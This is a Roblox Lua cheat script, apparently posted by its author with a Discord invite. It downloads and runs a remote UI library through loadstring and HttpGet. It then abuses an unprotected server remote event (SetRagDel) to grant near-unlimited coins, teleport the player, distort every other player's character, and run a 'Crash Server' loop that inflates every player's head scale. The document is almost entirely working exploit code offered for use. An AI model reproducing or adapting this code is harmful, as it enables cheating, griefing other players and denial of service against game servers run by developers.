-- Game devs hired me to fix my script so sorry 🙏

-- Our discord: https://discord.gg/w3C52QNPm3

-- Source code is below

    local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/vozoid/ui-libraries/main/drawing/void/source.lua"))()

    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer

    function SetValue(BaseValue,NewValue) 
        game:GetService("ReplicatedStorage").Events.SetRagDel:FireServer(BaseValue,NewValue)
    end

    local main = library:Load({
        Name = "MiscGunTest:X",
        SizeX = 440,
        SizeY = 220,
        Theme = "Midnight",
        Extension = "json",
        Folder = "MiscGunTest:X"
    })
    local main_tab = main:Tab("Main Tab")

    local left_section = main_tab:Section({
        Name = "Left Section",
        Side = "Left"
    })
    local right_section = main_tab:Section({
        Name = "Right Section",
        Side = "Right"
    })
    
    -- inf money
    left_section:Button({
        Name = "Inf money (big debt)",
        Callback = function() 
            while task.wait(.5) do 
                SetValue(LocalPlayer.Coins,90e17)
            end
        end
    })

    left_section:Button({
        Name = "TP to gun shop",
        Callback = function() 
            if LocalPlayer.Character then 
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(285.233673, -10.187871, -268.837585)
            end
        end
    })
    
    left_section:Button({
        Name = "Copy Discord Invite",
        Callback = function() 
            setclipboard("https://discord.gg/w3C52QNPm3")
        end
    })

    function TurnIntoStick(Player)
        if Player.Character then 
            local Humanoid = Player.Character:FindFirstChildOfClass("Humanoid")

            if Humanoid then 
                SetValue(Humanoid.BodyHeightScale,1000)
            end
        end
    end

    function CrashServer(Player)
        if Player.Character then 
            local Humanoid = Player.Character:FindFirstChildOfClass("Humanoid")

            if Humanoid then 
                SetValue(Humanoid.HeadScale,9e9)
            end
        end
    end

    local LoopStickAllBool = false
    right_section:Toggle({
        Name = "Loop Stick All",
        Flag = "LoopStickAll",
        callback = function(bool) 
            LoopStickAllBool = bool 

            while LoopStickAllBool and task.wait() do 
                for _,Player in pairs(Players:GetPlayers()) do 
                    TurnIntoStick(Player)
                    task.wait()
                end
            end
        end
    })

    right_section:Button({
        Name = "Stick All",
        Callback = function() 
            for _,Player in pairs(Players:GetPlayers()) do 
                TurnIntoStick(Player)
                task.wait()
            end
        end
    })

    right_section:Button({
        Name = "Crash Server",
        Callback = function() 
            while task.wait() do 
                for _,Player in pairs(Players:GetPlayers()) do 
                    CrashServer(Player)
                    task.wait()
                end
            end
        end
    })
